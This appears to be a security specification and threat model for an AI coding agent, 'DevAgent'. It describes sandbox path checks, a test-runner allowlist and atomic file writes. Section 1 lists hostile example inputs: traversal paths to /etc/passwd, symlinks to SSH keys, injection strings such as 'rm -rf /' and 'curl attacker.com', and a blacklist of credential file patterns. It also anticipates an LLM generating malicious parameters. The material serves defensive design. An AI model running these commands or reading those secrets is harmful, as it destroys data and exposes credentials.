# DevAgent — Security Specification & Threat Model

## 1. Threat Assumptions

The DevAgent execution system assumes the LLM can generate adversarial, hallucinated, or malicious parameters. The runtime enforces deterministic perimeter defenses before any host operating system API is called.

Potential attack vectors defended against:
1. **Directory Traversal**: Inputs containing `../../../../etc/passwd` or `src/../../../secret.txt`.
2. **Symlink Escapes**: Repositories containing internal symlinks pointing to external host paths (`link -> /etc/shadow` or `link -> ~/.ssh/id_rsa`).
3. **Arbitrary Command Injection**: Commands attempting sub-shell execution (`rm -rf / && pytest`, `; curl attacker.com`, `&& cat .env`).
4. **Credential Exfiltration**: Attempts to read `.env`, `.env.*`, `id_rsa`, `*.pem`, `*.key`, `credentials.json`, or `.git/config`.

---

## 2. Sandbox Path Validation Algorithm

Every path requested by a tool goes through strict canonicalization:

```
Input path
    ↓
Canonicalize sandbox root: canonical_root = sandbox_root.resolve()
    ↓
Compose candidate path: candidate = (canonical_root / raw_path)
    ↓
Resolve candidate with strict=False: resolved_target = candidate.resolve(strict=False)
    ↓
Verify relative subpath: resolved_target.relative_to(canonical_root)
    ├── FAILS → Raise SandboxViolation (Blocked)
    └── SUCCEEDS
            ↓
Sensitive file pattern check (fnmatch against blacklist)
    ├── MATCHES → Raise SensitiveFileAccessBlocked (Blocked)
    └── CLEAN
            ↓
Existence check (if must_exist=True): resolved_target.exists()
    ├── FALSE → Raise InvalidPathError
    └── TRUE → Path Allowed
```

Crucially, **containment is validated before existence**, preventing side-channel probing of external filesystems.

---

## 3. Disallowed Runner Policy

DevAgent does not expose arbitrary shell tools (`bash`, `sh`, `zsh`, `cmd`).
Instead, it exposes structured verification commands:
```json
{
  "runner": "pytest",
  "args": ["tests/test_cart.py"],
  "cwd": "."
}
```

The runner is matched against a strict allowlist:
- `pytest`
- `python -m pytest`
- `python3 -m pytest`
- `npm test`
- `npm run lint`
- `npm run typecheck`

All executions occur via `asyncio.create_subprocess_exec` passing split arguments as a list with `shell=False`. Shell expansion, piping, and chaining are strictly impossible.

---

## 4. Atomic Write Guarantee

File patching never overwrites the target directly with `open(file, "w")`.
1. A temporary file is written in the target file's parent directory (`.{target}.{uuid}.tmp`).
2. Python AST syntax validation (`ast.parse`) is performed against the candidate content.
3. If syntax validation fails, the temp file is deleted, and the original file remains untouched.
4. If syntax validation passes, `os.replace` executes an atomic rename on the filesystem.
